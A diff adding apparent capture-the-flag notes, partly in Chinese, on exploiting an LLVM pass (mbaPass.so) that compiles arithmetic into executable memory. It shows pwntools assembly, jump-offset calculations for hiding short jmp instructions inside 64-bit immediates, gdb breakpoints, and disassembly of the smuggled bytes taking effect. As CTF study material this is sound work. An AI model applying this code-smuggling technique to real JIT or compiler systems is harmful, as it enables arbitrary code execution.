@@ -1,0 +1,114 @@
+
+#clang-12 -emit-llvm -S exp.c -o exp.ll
+opt-12 -load ./mbaPass.so -mba exp.ll -S
+
+from pwn import*
+context(os='linux',arch='amd64')
+
+print(asm("mov rax, 0x8888888888888888"))
+b'H\xb8\x88\x88\x88\x88\x88\x88\x88\x88'
+
+print(asm("mov rbx, 0x8888888888888888"))
+b'H\xbb\x88\x88\x88\x88\x88\x88\x88\x88'
+
+writeMovImm64(this, 0, val) 是写入mov rax, val指令
+writeMovImm64(this, 1, val) 是写入mov rbx, val指令
+其中val可以是八字节数，共十字节
+
+writeRet(this) 写入ret
+
+writeInc(this, 1)  	#inc rax
+writeInc(this, -1) 	#dec rax
+
+writeOpReg(this, 1)	#add rax, rbx
+writeOpReg(this, 0) 	#sub rax, rbx
+
+ret i64 %317
+第一个操作数为变量：
+0xa字节
+mov rax, 0
+
+%317 = add nsw i64 %316, 256
+第一个操作数为变量，第二个为256：
+mov rbx, 0x100;
+add rax, rbx
+%2 = add nsw i64 %0, 261593573097472
+第一个操作数为变量，第二个为261593573097472：
+0xd字节
+mov rbx,0x0000edeb00000000	//48bb0000000000ebed
+add    rax,rbx		//4801d8
+
+%316 = add nsw i64 %315, 1
+第一个操作数为变量，第二个为1：
+3字节
+inc    rax		//48ffc0
+
+ebed	jmp ptr-17    0x7ffff7ff7ff1-0x7ffff7ff7fde-2=17 (减去\x48\xbb)
+ebeb	jmp ptr-19    0x7ffff7ff7fe6-0x0x7ffff7ff7fd1-2=19
+
+gdb:
+set args -load ./mbaPass.so -mba exp.ll -S
+b *(0x432702)
+
+mbaPass.so:
+#b *(0x7ffff7fb6000+0xEFD9) #callCode
+b *(0x7ffff7fb6000+0xEFCD) #_mprotect
+ 
+
+0x7ffff30a4bca
+0x7ffff7fc4f20 llvmpass.so
+
+0x4c9bc0：this
+0x4c9be0：this[4]
+
+第一次：
+x/10i 0x7ffff7ff7000
+0x7ffff7ff7000:	movabs rax,0x0
+0x7ffff7ff700a:	movabs rbx,0x100
+0x7ffff7ff7014:	add    rax,rbx
+0x7ffff7ff7017:	inc    rax
+0x7ffff7ff701a:	inc    rax
+0x7ffff7ff701d:	inc    rax
+0x7ffff7ff7020:	movabs rbx,0x100
+0x7ffff7ff702a:	add    rax,rbx
+0x7ffff7ff702d:	movabs rbx,0x100
+0x7ffff7ff7037:	add    rax,rbx
+
+x/12i 0x7ffff7ff7fde
+0x7ffff7ff7fde:	movabs rbx,0x100
+0x7ffff7ff7fe8:	add    rax,rbx
+0x7ffff7ff7feb:	movabs rbx,0xedeb00000000
+0x7ffff7ff7ff5:	add    rax,rbx
+0x7ffff7ff7ff8:	ret    
+0x7ffff7ff7ff9:	ret    
+0x7ffff7ff7ffa:	ret    
+0x7ffff7ff7ffb:	ret    
+0x7ffff7ff7ffc:	ret    
+0x7ffff7ff7ffd:	ret    
+0x7ffff7ff7ffe:	ret    
+0x7ffff7ff7fff:	ret
+
+第二次：
+0x7ffff7ff7000:	movabs rax,0x0
+0x7ffff7ff700a:	movabs rbx,0x100
+0x7ffff7ff7014:	add    rax,rbx
+0x7ffff7ff7017:	movabs rbx,0x100
+0x7ffff7ff7021:	add    rax,rbx
+0x7ffff7ff7024:	movabs rbx,0x100
+0x7ffff7ff702e:	add    rax,rbx
+0x7ffff7ff7031:	inc    rax
+0x7ffff7ff7034:	inc    rax
+0x7ffff7ff7037:	inc    rax
+
+0x7ffff7ff7fde:	movabs rbx,0xebeb90909090686a
+0x7ffff7ff7fe8:	add    rax,rbx
+0x7ffff7ff7feb:	inc    rax
+0x7ffff7ff7fee:	inc    rax
+0x7ffff7ff7ff1:	jmp    0x7ffff7ff7fe0
+0x7ffff7ff7ff3:	add    BYTE PTR [rax],al
+0x7ffff7ff7ff5:	add    rax,rbx
+0x7ffff7ff7ff8:	ret    
+0x7ffff7ff7ff9:	ret    
+0x7ffff7ff7ffa:	ret    
+0x7ffff7ff7ffb:	ret    
+0x7ffff7ff7ffc:	ret 
